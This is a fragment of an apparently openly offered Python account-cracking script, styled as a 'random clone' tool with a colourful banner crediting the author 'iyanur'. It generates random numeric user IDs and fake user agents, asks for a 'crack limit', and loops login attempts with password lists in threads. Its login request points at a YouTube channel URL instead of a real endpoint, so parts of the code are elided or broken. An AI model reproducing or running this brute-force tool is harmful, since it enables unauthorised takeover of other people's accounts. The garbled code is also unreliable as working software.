...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://youtube.com/@DJ71GAMING?si=ZEvbWc7_rLMD0x66")
logo =("""                        \033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
  

                        
d888888b db    db  .d8b.  d8b   db db    db d8888b. 
  `88'   `8b  d8' d8' `8b 888o  88 88    88 88  `8D 
   88     `8bd8'  88ooo88 88V8o 88 88    88 88oobY' 
   88       88    88~~~88 88 V8o88 88    88 88`8b   
  .88.      88    88   88 88  V888 88b  d88 88 `88. 
Y888888P    YP    YP   YP VP   V8P ~Y8888P' 88   YD 
...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] iyanur\033[1;39m            
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] BLOCK X LIST\033[1;39m   
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] iyanur420\033[1;39m          
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801735456987\033[1;39m     
...
def Jaber():
    os.system('clear')
    os.system('xdg-open https://youtube.com/@DJ71GAMING?si=SOFaPigix6AzgdSC')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m")
    print("\033[1;96m ╠═════════════════════════════════╣")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ YOUTUBE       \033[1;36m")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ YOUTUBE         \033[1;36m")
...
def Jabers():
    ...
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m300000\033[1;31m] [\033[1;32m5000000\033[1;31m] [\033[1;32m9999999\033[1;31m] \033[1;31m ")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;35m "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=1) as Fb_crack:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════╗")
        ...
        print(f'\033[1;91m║\033[1;92m MACK BY IYANUR x HACK ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM IYANUR ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Jaberm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_youtube = session.get('https://youtube.com/@DJ71GAMING?si=SOFaPigix6AzgdSC').text
            log_data = {
            ...
            "user-agent": pro}
            lo = session.post('https://youtube.com/@DJ71GAMING?si=SOFaPigix6AzgdSC',data=log_data,headers=header_freeyt).text
